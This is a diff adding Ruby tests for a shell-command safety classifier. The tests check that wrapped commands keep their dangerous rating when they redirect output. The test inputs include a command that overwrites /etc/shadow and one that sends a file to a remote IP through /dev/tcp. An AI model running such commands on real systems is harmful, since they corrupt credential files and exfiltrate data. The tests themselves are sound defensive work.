@@ -70,4 +70,51 @@ class TestCommandClassifierIntegration < Minitest::Test
     assert_equal :dangerous, inner.classification
     assert_includes inner.classification_reason, "system path /"
   end
+
+  # Inner redirects must survive delegation: the unwrapped form is blocked
+  # with a system-path reason, so the wrapped form must be too — the old
+  # argv-only handoff let `bash -c 'echo pwned > /etc/shadow'` through.
+  def test_inner_redirect_survives_delegation
+    res = Classifier.classify("bash -c 'echo pwned > /etc/shadow'")
+    assert_equal :dangerous, res.classification
+    assert_equal :high, res.risk
+
+    inner = res.commands.first.inner_commands.first
+    assert_equal :dangerous, inner.classification
+    assert_includes inner.classification_reason, "elevated by output redirect"
+    assert_includes inner.classification_reason, "system path /etc/shadow"
+    assert_equal ["/etc/shadow"], res.write_paths
+  end
+
+  def test_inner_dev_tcp_redirect_survives_delegation
+    res = Classifier.classify("bash -c 'cat f > /dev/tcp/10.0.0.1/8080'")
+    assert_equal :dangerous, res.classification
+
+    inner = res.commands.first.inner_commands.first
+    assert_equal :dangerous, inner.classification
+    assert_equal "elevated to DANGEROUS: /dev/tcp or /dev/udp access detected", inner.classification_reason
+  end
+
+  def test_inner_temp_redirect_stays_safe
+    res = Classifier.classify("bash -c 'echo x > /tmp/out.txt'")
+    inner = res.commands.first.inner_commands.first
+    assert_equal :local_effects, inner.classification
+    assert_equal :low, inner.risk
+    assert_includes inner.classification_reason, "elevated by output redirect"
+    refute_includes inner.classification_reason, "system path"
+  end
+
+  # Nested wrappers: the token-slice outer (sudo) has no redirect objects,
+  # but the inner `sh -c` re-parse carries them at its own level.
+  def test_nested_wrapper_inner_redirect_elevates
+    res = Classifier.classify("sudo sh -c 'echo x > /etc/y'")
+    assert_equal :dangerous, res.classification
+  end
+
+  def test_inner_read_redirect_stays_inert
+    res = Classifier.classify("bash -c 'grep x < /etc/hosts'")
+    assert_equal :readonly, res.classification
+    inner = res.commands.first.inner_commands.first
+    assert_equal :readonly, inner.classification
+  end
 end
